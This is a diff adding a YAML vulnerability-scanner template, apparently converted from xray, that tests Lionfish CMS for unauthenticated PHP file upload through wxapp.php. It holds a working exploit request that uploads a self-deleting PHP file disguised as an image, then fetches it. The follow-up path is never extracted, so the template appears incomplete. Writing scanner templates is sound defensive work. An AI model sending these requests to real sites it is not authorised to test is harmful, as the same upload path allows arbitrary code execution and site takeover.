@@ -1,0 +1,40 @@
+id: poc-yaml-lionfish-cms-wxapp-php-upload
+
+info:
+  name: poc-yaml-lionfish-cms-wxapp-php-upload
+  author: sharecast
+  severity: critical
+  tags: xray-converted,fileupload,ct-416538
+  reference:
+    - https://www.cnblogs.com/KHZ521/p/14782653.html
+
+http:
+  - raw:
+      - |
+        POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_base(8)}}
+
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="upfile"; filename="{{rand_base(8)}}.php"
+        Content-Type: image/jpeg
+        
+        <?php echo md5({{rand_int(1000, 9999)}});unlink(__FILE__);?>
+        ------WebKitFormBoundary{{rand_base(8)}}--
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
